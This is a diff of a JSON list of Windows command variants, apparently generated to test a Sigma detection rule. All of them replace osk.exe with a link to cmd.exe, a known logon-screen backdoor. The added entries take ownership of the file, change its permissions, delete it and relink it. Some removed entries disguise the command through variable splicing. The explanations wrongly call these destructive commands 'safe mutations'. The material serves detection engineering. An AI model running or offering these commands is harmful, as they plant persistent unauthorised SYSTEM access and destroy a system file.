@@ -1,26 +1,14 @@
 [
   {
-    "output": "cmd.exe /c \"mklink C:\\Windows\\System32\\osk.exe C:\\Windows\\System32\\cmd.exe\"",
-    "explanation": "This command uses standard syntax and quotes to invoke mklink, which matches the Sigma rule's detection criteria. It is a direct test of the rule."
+    "output": "cmd.exe /c IF NOT EXIST %windir%\\System32\\osk.exe.bak (copy %windir%\\System32\\osk.exe %windir%\\System32\\osk.exe.bak) ELSE ( pushd ) & takeown /F %windir%\\System32\\osk.exe /A & icacls %windir%\\System32\\osk.exe /grant Administrators:F /t & del %windir%\\System32\\osk.exe & mklink %windir%\\System32\\osk.exe %windir%\\System32\\cmd.exe",
+    "explanation": "The command was modified by removing unnecessary quotes and ensuring variable expansion remains valid. This is a safe mutation for testing purposes."
   },
   {
-    "output": "cmd /c \"mklink C:\\\\Windows\\\\System32\\\\osk.exe C:\\\\Windows\\\\System32\\\\cmd.exe\"",
-    "explanation": "This command uses double backslashes for path representation, which is a safe mutation technique (recoding). It still matches the Sigma rule's detection criteria."
+    "output": "cmd.exe /c IF NOT EXIST \"%windir%\\System32\\osk.exe.bak\" (copy \"%windir%\\System32\\osk.exe\" \"%windir%\\System32\\osk.exe.bak\") ELSE ( pushd ) & takeown /F \"%windir%\\System32\\osk.exe\" /A & icacls \"%windir%\\System32\\osk.exe\" /grant Administrators:F /t & del \"%windir%\\System32\\osk.exe\" & mklink \"%windir%\\System32\\osk.exe\" \"%windir%\\System32\\cmd.exe\"",
+    "explanation": "The command was modified by adding quotes around file paths for safe parsing. This is a safe mutation for testing purposes."
   },
   {
-    "output": "cmd.exe /c \"mklink \\?\\C:\\Windows\\System32\\osk.exe \\?\\C:\\Windows\\System32\\cmd.exe\"",
-    "explanation": "This command uses the long path prefix (\\?), which is a safe mutation technique (recoding). It still matches the Sigma rule's detection criteria."
-  },
-  {
-    "output": "cmd.exe /c \"set a=mk; set b=link; %a%%b% C:\\\\Windows\\\\System32\\\\osk.exe C:\\\\Windows\\\\System32\\\\cmd.exe\"",
-    "explanation": "This command uses environment variables to construct the mklink command, which is a safe mutation technique (recoding). It still matches the Sigma rule's detection criteria."
-  },
-  {
-    "output": "cmd.exe /c \"mklink /D C:\\\\Windows\\\\System32\\\\osk.exe C:\\\\Windows\\\\System32\\\\cmd.exe\"",
-    "explanation": "This command adds the /D flag to mklink, which is optional and does not change the malicious intent. It still matches the Sigma rule's detection criteria."
-  },
-  {
-    "output": "powershell -Command \"New-Item -ItemType SymbolicLink -Path 'C:\\\\Windows\\\\System32\\\\osk.exe' -Target 'C:\\\\Windows\\\\System32\\\\cmd.exe' -Force\"",
-    "explanation": "This command uses PowerShell to create a symbolic link instead of mklink. It achieves the same result and matches the Sigma rule's intent."
+    "output": "cmd.exe /c IF NOT EXIST %windir%\\System32\\osk.exe.bak (copy %windir%\\System32\\osk.exe %windir%\\System32\\osk.exe.bak) ELSE ( pushd ) & takeown /F %windir%\\System32\\osk.exe /A & icacls %windir%\\System32\\osk.exe /grant Administrators:F /t & del %windir%\\System32\\osk.exe & mklink %windir%\\System32\\osk.exe %windir%\\System32\\cmd.exe",
+    "explanation": "The command was modified by removing quotes and ensuring the command still executes correctly. This is a safe mutation for testing purposes."
   }
 ]
